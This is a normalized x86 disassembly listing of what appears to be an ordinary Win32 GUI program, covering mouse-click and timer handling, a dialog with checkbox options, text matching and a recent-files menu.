call sub_416da0
add esp 0x8
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov ecx edi
call sub_40dcd0
test eax eax
jne r-xdata
mov ebp 0xa
mov ecx edi
call sub_40dd20
test eax eax
jne r-xdata
push 0x0
push eax
mov ecx esi
call sub_421a50
mov ecx [ edi ]
mov edx [ ecx ]
push 0x1
push edx
mov ecx esi
call sub_421a50
push 0x0
push 0x0
push 0x27
mov ecx esi
call sub_40f360
mov ecx esi
call sub_424ac0
jmp r-xdata
mov ecx edi
call sub_40dd20
test eax eax
push 0x0
push 0x0
mov ecx esi
push 0xd
je r-xdata
push 0x0
push 0x0
push 0xd
mov ecx esi
call sub_40f360
mov edx [ edi ]
mov eax [ edx + 0x4 ]
push 0x1
push eax
mov ecx esi
call sub_421a50
mov ecx esi
call sub_424ac0
jmp r-xdata
mov cl [ eax + 0x1e ]
test cl cl
jne r-xdata
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
cmp eax 0x5
jne r-xdata
jmp r-xdata
push 0x1
mov ecx esi
mov [ esi + 0x7c ] bp
call sub_424aa0
mov ecx rw-data
call sub_417ce0
test eax eax
jne r-xdata
push ebp
push 0x1
call sub_424dd0
movsx ecx [ esi + 0x5c ]
mov edx [ esi + 0x58 ]
movsx ebx [ edi + 0x8 ]
mov eax [ edi + 0x4 ]
mov ebp [ eax ]
push ecx
mov ecx [ edi ]
push edx
push esi
add ebx ebp
call sub_4220d0
mov eax [ edi ]
mov [ esi + 0x5c ] bx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x58 ] ecx
mov ecx edi
call sub_40db00
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
call sub_424d30
mov eax [ edi ]
cmp [ eax + 0x18 ] ebp
jne r-xdata
cmp ebp 0x5
jne r-xdata
mov edx [ esi + 0x58 ]
mov ecx [ edi ]
push 0x1
push edx
push esi
call sub_421ad0
push 0x0
push 0x0
push 0x27
mov ecx esi
call sub_40f360
mov ecx [ edi ]
push 0x1
push 0x0
push esi
call sub_421ad0
mov ecx esi
call sub_424ac0
jmp r-xdata
push eax
push 0x30
mov ecx esi
call sub_424dd0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
movsx ebp [ edi + 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x18 ]
add ebp ecx
mov ecx [ eax ]
mov eax [ eax + 0x10 ]
sub edx ebp
push edx
lea edx [ eax + ebp * 2 ]
mov eax [ ecx + 0x8 ]
push edx
push 0x0
push eax
push esi
call sub_421d20
mov ecx [ edi ]
mov [ ecx + 0x18 ] ebp
call sub_40f360
mov edx [ edi ]
mov eax [ edx + 0x4 ]
push eax
mov ecx esi
call sub_421980
test eax eax
jne r-xdata
call sub_40f360
mov ecx [ edi ]
push 0x1
push ecx
mov ecx esi
call sub_421a50
mov edi [ edi ]
cmp edi [ esi + 0x50 ]
jne r-xdata
push 0x1
push eax
mov ecx esi
call sub_421a50
push 0x0
push 0x0
push 0x27
mov ecx esi
call sub_40f360
mov ecx esi
call sub_424ac0
jmp r-xdata
mov [ eax + 0x1e ] 0x0
mov ecx [ edi ]
mov eax [ ecx ]
mov ebx [ eax + 0x18 ]
mov eax [ eax + 0x10 ]
mov edx [ ecx + 0xc ]
push ebx
push eax
mov eax [ edx + 0x4 ]
push eax
push edx
push esi
call sub_421d20
push ebp
push 0x30
mov ecx esi
call sub_424dd0
mov ecx [ edi ]
mov edx [ ecx ]
push edx
mov ecx esi
call sub_4218f0
mov ecx esi
call sub_424ac0
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov ecx [ eax ]
mov dl [ ecx + 0x1e ]
test dl dl
je r-xdata
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
cmp ebp eax
jne r-xdata
mov ebp 0xa
mov ecx esi
call sub_424ac0
jmp r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
push 0x1
push edx
mov ecx esi
call sub_421a50
push 0x0
push 0x0
push 0x27
mov ecx esi
call sub_40f360
mov ecx esi
call sub_424ac0
jmp r-xdata
push edi
mov ecx esi
call sub_421980
mov [ edi ] ecx
mov edx [ ecx + 0x8 ]
mov eax ecx
mov [ esi + 0x58 ] edx
mov [ esi + 0x5c ] bp
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_4218f0
mov ecx esi
call sub_424ac0
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push 0x1
push 0x0
push 0x27
mov ecx esi
call sub_40f360
mov ecx edi
call sub_40dcd0
test eax eax
je r-xdata
jmp r-xdata
sub_410230
mov eax [ esp + 0x4 ]
sub esp 0x18
push ebx
push esi
add eax 0xfffffeed
cmp eax 0xef
push edi
mov edi [ esp + 0x30 ]
mov esi ecx
ja r-xdata
mov ecx [ esi + 0x8 ]
push ecx
call [ SetFocus@IAT ]
movsx edx di
shr edi 0x10
movsx eax di
mov [ esp + 0x30 ] eax
cmp [ esi + 0xc ] 0x40
mov [ esp + 0x2c ] edx
mov [ esp + 0xc ] edi
mov eax rw-data
je r-xdata
movzx eax [ eax + lookup_table_4106e4 ]
jmp [ eax * 4 + jump_table_4106d0 ]
movsx ebx [ eax + 0x14 ]
mov edi [ esi + 0x6c ]
push ebp
mov ebp [ esi + 0x68 ]
test ebp ebp
je r-xdata
mov eax rw-data
mov ecx [ esi + 0x8 ]
push 0x2
push ecx
mov [ rw-data ] 0x0
call [ KillTimer@IAT ]
call [ ReleaseCapture@IAT ]
movsx edx [ rw-data ]
movsx eax [ rw-data ]
push edx
push eax
mov ecx esi
call sub_40ed40
pop edi
pop esi
pop ebx
add esp 0x18
retn 0xc
mov ecx [ esi + 0x8 ]
push 0x2
push ecx
call [ KillTimer@IAT ]
call [ ReleaseCapture@IAT ]
jmp r-xdata
mov bl [ esp + 0x2c ]
test bl 0x4
je r-xdata
mov ebx [ GetSystemMetrics@IAT ]
push 0x24
call ebx
movsx edx [ rw-data ]
mov ecx eax
movzx eax di
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jg r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
shr edx 0x10
push 0x0
mov [ rw-data ] di
mov [ rw-data ] dx
call [ GetDoubleClickTime@IAT ]
push eax
mov eax [ esi + 0x8 ]
push 0x2
push eax
call [ SetTimer@IAT ]
mov ecx [ esi + 0x8 ]
push ecx
call [ SetCapture@IAT ]
test bl 0x8
je r-xdata
mov [ esp + 0x28 ] 0x404
jmp r-xdata
mov eax [ esi + 0x8 ]
push 0x2
push eax
call [ KillTimer@IAT ]
push 0x25
call ebx
movsx edx [ rw-data ]
mov ecx eax
mov eax edi
shr eax 0x10
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jle r-xdata
mov edx [ esi + 0x74 ]
mov eax [ esp + 0x30 ]
xor ecx ecx
cmp [ rw-data ] cx
mov [ esp + 0x14 ] ebp
sete cl
add edx eax
mov [ esp + 0x18 ] edi
push ecx
push edx
push esi
lea ecx [ esp + 0x20 ]
call sub_40da20
mov ebx [ esp + 0x2c ]
xor eax eax
cmp ebx 0x202
je r-xdata
mov ebp [ esi + 0x50 ]
mov edi [ ebp + 0xc ]
cmp ebx [ esp + 0x34 ]
jge r-xdata
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x18
retn 0xc
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jge r-xdata
mov [ esp + 0x28 ] 0x203
cmp ebx 0x204
jne r-xdata
cmp ebx 0x204
jne r-xdata
cmp [ esi + 0xc ] 0x40
mov eax rw-data
je r-xdata
mov ebp [ ebp ]
test ebp ebp
jne r-xdata
lea ecx [ ecx ]
mov [ esp + 0x28 ] 0x204
jmp r-xdata
cmp ebx 0x203
jg r-xdata
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov [ esi + 0x54 ] ecx
mov cx [ esp + 0x1c ]
mov [ esi + 0x58 ] edx
mov [ esi + 0x5c ] cx
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
call sub_40ec80
test eax eax
jne r-xdata
movsx ecx [ eax + 0x6 ]
movsx edx [ ebp + 0x1c ]
imul ecx edx
mov edi [ edi + 0x8 ]
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add ebx edx
test edi edi
jne r-xdata
mov eax rw-data
cmp ebx 0x204
je r-xdata
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
mov ecx esi
call sub_40ed40
mov ecx esi
call sub_40e3d0
cmp ebx 0x404
jne r-xdata
push 0x0
push 0x1
push 0x57
mov ecx esi
call sub_40f360
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0xc
mov eax ebx
sub eax 0x201
je r-xdata
cmp [ rw-data ] ebp
jne r-xdata
push 0x0
push 0x1
push 0x49
mov ecx esi
call sub_40f360
mov [ esp + 0x2c ] 0x204
mov ecx esi
call sub_40e3d0
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
jmp r-xdata
dec eax
jne r-xdata
mov ecx [ esi + 0x54 ]
mov edx [ esi + 0x58 ]
mov ax [ esi + 0x5c ]
mov [ rw-data ] ecx
mov ecx esi
mov [ rw-data ] edx
mov [ rw-data ] ax
call sub_40e6d0
xor ecx ecx
cmp ebx 0x204
sete cl
dec ecx
and ecx 0x2
push ecx
mov ecx esi
call sub_40eef0
cmp [ rw-data ] edi
jne r-xdata
mov cl [ esi + 0x44 ]
xor eax eax
test cl cl
mov [ rw-data ] ax
je r-xdata
pop ebp
mov bl [ esi + 0xc ]
cmp bl 0x40
mov eax rw-data
je r-xdata
mov ax [ rw-data ]
cmp ax [ esi + 0x5c ]
je r-xdata
mov edx [ esi + 0x1c ]
cmp edx [ esi + 0x30 ]
jne r-xdata
movsx edx [ eax ]
movzx ecx [ esp + 0x10 ]
mov eax 0x55555556
imul edx
mov eax edx
shr eax 0x1f
add edx eax
cmp ecx edx
jge r-xdata
mov eax rw-data
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ esi + 0x20 ]
cmp ecx [ esi + 0x34 ]
jne r-xdata
cmp bl 0x40
mov eax rw-data
je r-xdata
mov edx [ esi + 0x4c ]
mov eax [ esi + 0x6c ]
cmp eax [ edx + 0x8 ]
je r-xdata
mov dx [ esi + 0x24 ]
cmp dx [ esi + 0x38 ]
jne r-xdata
movsx edx [ eax ]
mov eax 0x55555556
imul edx
mov eax edx
shr eax 0x1f
add edx eax
movsx eax [ esi + 0x84 ]
sub eax edx
cmp ecx eax
jle r-xdata
mov eax rw-data
xor eax eax
jmp r-xdata
mov ecx esi
mov [ esp + 0x2c ] 0x204
mov [ rw-data ] eax
call sub_40e3d0
jmp r-xdata
mov eax [ esi + 0x50 ]
mov ecx [ eax + 0xc ]
push 0x0
lea edx [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
push edx
mov ecx esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x24 ] 0x0
call sub_40e010
cmp [ esi + 0xc ] 0x40
mov eax rw-data
je r-xdata
push 0x0
push eax
mov eax [ esi + 0x8 ]
push 0x115
push eax
call [ SendMessageA@IAT ]
mov ecx [ esi + 0x8 ]
push ecx
call [ UpdateWindow@IAT ]
movsx edx [ rw-data ]
mov eax [ esi + 0x8 ]
push 0x0
push edx
push 0x1
push eax
call [ SetTimer@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0xc
mov ebx [ esp + 0x2c ]
movsx eax [ eax + 0x6 ]
mov ecx [ esi + 0x78 ]
movsx edx [ esi + 0x84 ]
sub ecx eax
mov eax [ esp + 0x24 ]
add ecx edx
cmp eax ecx
jle r-xdata
mov eax rw-data
mov eax 0x1
sub_4107e0
push esi
push 0x0
push 0x10
mov esi ecx
call sub_424dd0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_40ee50
mov ecx esi
call sub_40e6d0
pop esi
retn 0x8
sub_410810
cmp eax 0x2400
jge r-xdata
retn
mov cl [ rw-data ]
test cl cl
je r-xdata
mov cl [ rw-data ]
test cl cl
je r-xdata
mov ecx eax
and ecx 0x7f00
cmp ecx 0x2300
jne r-xdata
test ah 0x7f
jne r-xdata
push eax
call sub_417650
add esp 0x4
push eax
call sub_429b24
add esp 0x4
sub_410880
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_429931
add esp 0x4
mov eax [ esp + 0x8 ]
test eax eax
mov [ esi + 0x10 ] 0x0
mov [ esi + 0xc ] 0x0
je r-xdata
push eax
call sub_429931
add esp 0x4
pop esi
retn 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov [ esi + 0x8 ] 0x0
push eax
call sub_429931
add esp 0x4
sub_4108e0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov eax [ ecx + 0x18 ]
mov eax [ ecx + 0x1c ]
jmp r-xdata
mov edx [ esp + 0x8 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push 0x30
push 0x4
push 0x86
push eax
call sub_420e20
add esp 0x10
retn 0x8
mov ecx [ ecx ]
test ecx ecx
je r-xdata
push ecx
push 0x40
push 0x88
push 0x87
push eax
call sub_420e20
add esp 0x14
retn 0x8
sub_410940
push ebx
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
push edi
je r-xdata
movsx edx [ esi + 0x14 ]
xor ecx ecx
test edx edx
jle r-xdata
xor edi edi
cmp [ esi + 0x14 ] di
jle r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x4
mov eax [ esp + 0x10 ]
mov esi [ esi + 0x10 ]
sub esi eax
jmp r-xdata
mov ebx [ esp + 0x10 ]
jmp r-xdata
mov di [ eax ]
cmp di [ esi + eax ]
jne r-xdata
movzx eax [ ebx + edi * 2 ]
call sub_410810
mov ecx [ esi + 0xc ]
movzx edx [ ecx + edi * 2 ]
cmp eax edx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x4
inc ecx
add eax 0x2
cmp ecx edx
jl r-xdata
movsx eax [ esi + 0x14 ]
inc edi
cmp edi eax
jl r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x4
sub_4109d0
mov eax [ esp + 0x8 ]
cmp eax 0x110
push ebx
push ebp
push esi
push edi
mov edi ecx
ja r-xdata
cmp eax 0x111
jne r-xdata
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x14
mov eax [ esp + 0x1c ]
cmp eax 0x59c
jg r-xdata
mov eax [ esp + 0x20 ]
test eax eax
mov esi [ esp + 0x14 ]
je r-xdata
sub eax 0x2
je r-xdata
sub eax 0x59e
je r-xdata
je r-xdata
mov [ edi + 0x18 ] esi
mov [ edi + 0x1c ] esi
jmp r-xdata
mov ecx [ esp + 0x20 ]
xor eax eax
cmp ecx eax
je r-xdata
sub eax 0x51
jne r-xdata
mov edx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x412
push 0x596
push edx
call [ SendDlgItemMessageA@IAT ]
dec eax
jne r-xdata
mov esi [ esp + 0x14 ]
push 0x59c
push esi
call [ IsDlgButtonChecked@IAT ]
neg eax
sbb eax eax
inc eax
push eax
push 0x59b
push esi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
dec eax
je r-xdata
mov edx [ esp + 0x24 ]
xor eax eax
test edx edx
sete al
push eax
push 0x59c
push esi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
push 0x0
push 0x405
push 0x596
push esi
call ebp
push 0x1
push esi
call sub_4258a0
movzx edx [ rw-data ]
mov ebx [ CheckDlgButton@IAT ]
add esp 0x8
push edx
push 0x598
push esi
call ebx
movzx eax [ rw-data ]
push eax
push 0x599
push esi
call ebx
movzx ecx [ rw-data ]
push ecx
push 0x59b
push esi
call ebx
movzx edx [ rw-data ]
push edx
push 0x59c
push esi
call ebx
mov eax [ edi + 0x10 ]
movsx ecx [ edi + 0x14 ]
mov ebp [ SendDlgItemMessageA@IAT ]
push eax
push ecx
push 0x408
push 0x596
push esi
call ebp
push rw-data
push 0x59e
push 0x411
push 0x596
push esi
call ebp
mov eax [ esp + 0x24 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov [ edi + 0x18 ] eax
call sub_4258e0
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x14
mov ecx [ esp + 0x14 ]
push ecx
mov [ edi + 0x1c ] eax
call sub_4258e0
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x14
mov eax [ esp + 0x14 ]
push 0x50a
push eax
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
mov ecx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x412
push 0x597
push ecx
call [ SendDlgItemMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x14
mov esi [ esp + 0x20 ]
push esi
mov ecx edi
call sub_410880
mov ebx [ IsDlgButtonChecked@IAT ]
mov [ edi + 0x4 ] si
mov esi [ esp + 0x14 ]
push 0x598
push esi
call ebx
push 0x599
push esi
mov [ rw-data ] al
call ebx
push 0x59a
push esi
mov [ rw-data ] al
call ebx
push 0x59b
push esi
mov [ rw-data ] al
call ebx
push 0x59c
push esi
mov [ rw-data ] al
call ebx
lea ebp [ edi + 0x10 ]
push ebp
push 0x596
push esi
mov [ rw-data ] al
call sub_402150
mov edx [ ebp ]
movsx ecx ax
push ecx
push edx
mov [ edi + 0x14 ] ax
call sub_420d70
add esp 0x14
test eax eax
mov [ ebp ] eax
jne r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push ecx
push edx
push 0x59c
push 0x111
push esi
mov ecx edi
call sub_4109d0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
movzx ecx [ rw-data ]
push ecx
push 0x59d
push esi
call ebx
mov edx [ edi + 0x8 ]
movsx eax [ edi + 0x6 ]
push edx
push eax
push 0x408
push 0x597
push esi
call ebp
push rw-data
push 0x59f
push 0x411
push 0x597
push esi
call ebp
mov cl [ rw-data ]
test cl cl
jne r-xdata
push esi
call sub_420ef0
add esp 0x4
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
mov eax [ esp + 0x14 ]
push eax
call [ DestroyWindow@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
sub eax 0x3e5
jne r-xdata
movsx ecx [ edi + 0x14 ]
push ecx
push eax
call sub_420d70
add esp 0x8
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov cl [ rw-data ]
test cl cl
je r-xdata
xor ebp ebp
cmp [ edi + 0x14 ] bp
jle r-xdata
push esi
call sub_420ef0
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov edx [ edi + 0xc ]
movzx eax [ edx + ebp * 2 ]
call sub_410810
mov ecx [ edi + 0xc ]
mov [ ecx + ebp * 2 ] ax
movsx edx [ edi + 0x14 ]
inc ebp
cmp ebp edx
jl r-xdata
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
push 0x59d
push esi
call ebx
lea ebx [ edi + 0x8 ]
push ebx
push 0x597
push esi
mov [ rw-data ] al
call sub_402150
mov ecx [ ebx ]
mov [ edi + 0x6 ] ax
movsx eax ax
push eax
push ecx
call sub_420d70
add esp 0x14
mov [ ebx ] eax
mov eax [ rw-data ]
push 0x0
push 0x2726
push 0x111
push eax
call [ SendMessageA@IAT ]
movsx edx [ edi + 0x14 ]
push edx
call sub_40b920
jmp r-xdata
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
call [ DestroyWindow@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
mov al [ rw-data ]
test al al
push esi
jne r-xdata
sub_410e20
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x110
jne r-xdata
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
movzx ecx [ esp + 0x14 ]
push eax
push 0x0
push ecx
push edi
push esi
mov ecx rw-data
call sub_4109d0
pop edi
pop esi
retn 0x10
mov eax [ esp + 0x18 ]
push eax
push 0xffffffeb
push esi
call [ SetWindowLongA@IAT ]
sub_410e70
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x0
push sub_410df0
push eax
push 0x396
call sub_420cd0
add esp 0x10
retn
push eax
call [ SetForegroundWindow@IAT ]
retn
sub_410ea0
mov ecx [ ecx + 0x18 ]
test ecx ecx
push esi
mov esi [ esp + 0x8 ]
je r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov eax [ esi + 0x5c ]
push eax
call [ GetParent@IAT ]
jmp r-xdata
pop esi
mov [ esp + 0x4 ] ecx
jmp [ SetForegroundWindow@IAT ]
push esi
push sub_410e20
push eax
push 0x398
call sub_420cd0
add esp 0x10
pop esi
retn 0x4
sub_410ef0
sub esp 0x34
mov eax [ ecx + 0x10 ]
test eax eax
mov eax [ esp + 0x38 ]
mov [ esp + 0x4 ] ecx
mov [ esp ] 0x5aa
jne r-xdata
test eax eax
je r-xdata
push eax
call sub_410ea0
add esp 0x34
retn 0x4
push ebx
mov [ ecx ] 0x0
mov edx [ rw-data ]
push ebp
push esi
push edi
lea esi [ edx + 0x54 ]
mov ecx 0x5
lea edi [ esp + 0x1c ]
[ edi ] [ esi ]
mov bx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
mov ebp [ esp + 0x1c ]
mov [ edx + 0x7c ] 0x0
mov ecx [ ebp + 0x8 ]
add bx [ eax ]
mov [ esp + 0x20 ] ecx
mov ecx 0x5
lea esi [ esp + 0x1c ]
lea edi [ esp + 0x30 ]
mov [ esp + 0x24 ] bx
mov [ esp + 0x48 ] edx
mov [ esp + 0x18 ] edx
[ edi ] [ esi ]
jmp r-xdata
movsx ecx [ ecx + 0x14 ]
push ecx
mov ecx eax
call sub_40b920
add esp 0x34
retn 0x4
mov al [ rw-data ]
test al al
mov eax [ esp + 0x10 ]
je r-xdata
cmp eax 0x5ab
je r-xdata
cmp eax 0x5ab
je r-xdata
test ebp ebp
je r-xdata
inc bx
test ebp ebp
je r-xdata
dec bx
mov edi [ esp + 0x10 ]
mov eax [ rw-data ]
mov ecx [ esp + 0x14 ]
xor edx edx
cmp edi 0x5ab
sete dl
push edx
push eax
call sub_4108e0
mov ecx [ ebp + 0x18 ]
movsx eax bx
cmp eax ecx
jg r-xdata
test bx bx
jl r-xdata
mov ebp [ ebp ]
test ebp ebp
mov [ esp + 0x1c ] ebp
jne r-xdata
cmp [ esp + 0x18 ] edx
jne r-xdata
mov ebp [ ebp + 0x4 ]
test ebp ebp
mov [ esp + 0x1c ] ebp
jne r-xdata
lea ecx [ ecx ]
xor bx bx
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov esi [ esp + 0x14 ]
movsx edi [ esi + 0x14 ]
add edi eax
cmp edi ecx
jg r-xdata
cmp [ esp + 0x30 ] ebp
jne r-xdata
mov bx [ ebp + 0x18 ]
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ esp + 0x14 ]
movsx esi [ ecx + 0x14 ]
mov edi [ ebp + 0x18 ]
movsx eax bx
add esi eax
cmp esi edi
jg r-xdata
cmp [ esp + 0x30 ] ebp
jne r-xdata
mov [ esp + 0x24 ] bx
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ edx ]
mov ebp [ eax + 0x4c ]
mov [ esp + 0x48 ] eax
mov edx eax
mov [ esp + 0x1c ] ebp
xor bx bx
jmp r-xdata
mov ecx [ ebp + 0x18 ]
inc bx
movsx eax bx
cmp eax ecx
mov [ esp + 0x24 ] bx
jle r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ecx + eax * 2 ]
push edx
mov ecx esi
call sub_410940
test eax eax
jne r-xdata
cmp [ esp + 0x38 ] bx
je r-xdata
mov [ esp + 0x24 ] bx
nop
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ edx + 0x4 ]
mov ebp [ eax + 0x50 ]
mov [ esp + 0x48 ] eax
mov edx eax
jmp r-xdata
dec bx
mov [ esp + 0x24 ] bx
jns r-xdata
mov edx [ ebp + 0x10 ]
lea eax [ edx + eax * 2 ]
push eax
call sub_410940
test eax eax
jne r-xdata
cmp [ esp + 0x38 ] bx
je r-xdata
mov ebp [ edx + 0x4c ]
mov [ esp + 0x1c ] ebp
mov ecx [ esp + 0x48 ]
cmp ecx [ rw-data ]
je r-xdata
mov edx [ esp + 0x48 ]
mov ebp [ edx + 0x50 ]
test ebp ebp
mov [ esp + 0x1c ] ebp
je r-xdata
cmp [ esp + 0x18 ] edx
jne r-xdata
mov edx [ esp + 0x48 ]
mov edi [ rw-data ]
add edi 0x30
mov ecx 0x5
lea esi [ esp + 0x1c ]
[ edi ] [ esi ]
mov eax [ rw-data ]
lea esi [ eax + 0x30 ]
lea edi [ eax + 0x1c ]
mov ecx 0x5
[ edi ] [ esi ]
mov eax [ rw-data ]
lea esi [ eax + 0x1c ]
lea edi [ eax + 0x54 ]
mov ecx 0x5
[ edi ] [ esi ]
mov eax [ rw-data ]
mov esi [ esp + 0x14 ]
mov [ eax + 0x44 ] 0x1
mov cx [ esi + 0x14 ]
mov eax [ rw-data ]
add [ eax + 0x38 ] cx
mov ecx [ rw-data ]
call sub_40db40
cmp [ esi + 0x4 ] 0x0
je r-xdata
call sub_4113e0
mov ecx [ rw-data ]
call sub_40f190
mov al [ rw-data ]
test al al
je r-xdata
cmp [ esp + 0x10 ] 0x5ab
je r-xdata
mov [ esp + 0x10 ] 0x5ab
jmp r-xdata
cmp [ esp + 0x10 ] 0x5aa
je r-xdata
mov ecx [ rw-data ]
call sub_40f190
mov edx [ esi + 0x1c ]
push 0x50a
push 0x0
push 0x38e
push edx
call sub_4214f0
add esp 0x10
cmp eax 0x2
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ esp + 0x48 ]
cmp [ esp + 0x18 ] eax
jne r-xdata
mov edx [ esp + 0x48 ]
lea esp [ esp ]
mov esi [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x34
retn 0x4
mov ecx [ rw-data ]
call sub_424d30
mov ecx [ rw-data ]
call sub_40f040
movsx edx [ esi + 0x6 ]
mov eax [ esi + 0x8 ]
push edx
push eax
mov eax [ rw-data ]
movsx ecx [ eax + 0x24 ]
mov edx [ eax + 0x20 ]
push ecx
mov ecx [ eax + 0x1c ]
push edx
push eax
call sub_421d20
mov ecx [ rw-data ]
call sub_424ac0
mov ecx [ esi ]
mov eax [ esp + 0x10 ]
inc ecx
cmp eax 0x5ab
mov [ esi ] ecx
jne r-xdata
cmp [ esp + 0x30 ] ebp
jne r-xdata
mov al [ rw-data ]
test al al
mov edx [ esp + 0x48 ]
je r-xdata
cmp bx [ esp + 0x38 ]
jg r-xdata
mov ecx [ esp + 0x14 ]
add bx [ ecx + 0x6 ]
mov [ esp + 0x24 ] bx
jmp r-xdata
mov eax [ esp + 0x14 ]
sub bx [ eax + 0x14 ]
mov [ esp + 0x24 ] bx
jmp r-xdata
mov cx [ esi + 0x6 ]
sub cx [ esi + 0x14 ]
add [ esp + 0x38 ] cx
sub_4112c0
push ecx
push 0x2
lea eax [ esp + 0x4 ]
push eax
mov ecx esi
call sub_401380
test eax eax
je r-xdata
movsx ecx [ esp ]
shl ecx 0x1
push ecx
push 0x0
mov ecx esi
call sub_401380
neg eax
sbb eax eax
inc eax
pop ecx
retn
xor eax eax
pop ecx
retn
sub_4112f0
mov eax [ rw-data ]
sub esp 0x200
push ebx
push ebp
push esi
mov esi [ GetSubMenu@IAT ]
push edi
push 0xd
push 0x0
push eax
call esi
push eax
call esi
mov ecx [ esp + 0x214 ]
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
mov esi eax
call [ wsprintfA@IAT ]
mov ebp [ InsertMenuA@IAT ]
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
push 0x4e20
push 0x400
push 0x0
push esi
call ebp
lea ecx [ esp + 0x10 ]
push ecx
mov ebx 0x1
push ebx
push ebx
push esi
call sub_420fe0
mov edi eax
add esp 0x10
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
push 0x400
push ebx
push esi
call [ RemoveMenu@IAT ]
cmp edi 0x271c
je r-xdata
dec ebx
cmp ebx 0x9
jge r-xdata
mov edx [ esp + 0x214 ]
push edx
lea eax [ esp + 0x17 ]
push eax
call sub_431aa6
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push edx
lea eax [ ebx + 0x4e20 ]
push eax
push 0x400
mov cl bl
push ebx
add cl 0x31
push esi
mov [ esp + 0x25 ] cl
call ebp
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x1
inc ebx
push ebx
push esi
call sub_420fe0
mov edi eax
add esp 0x10
test edi edi
jne r-xdata
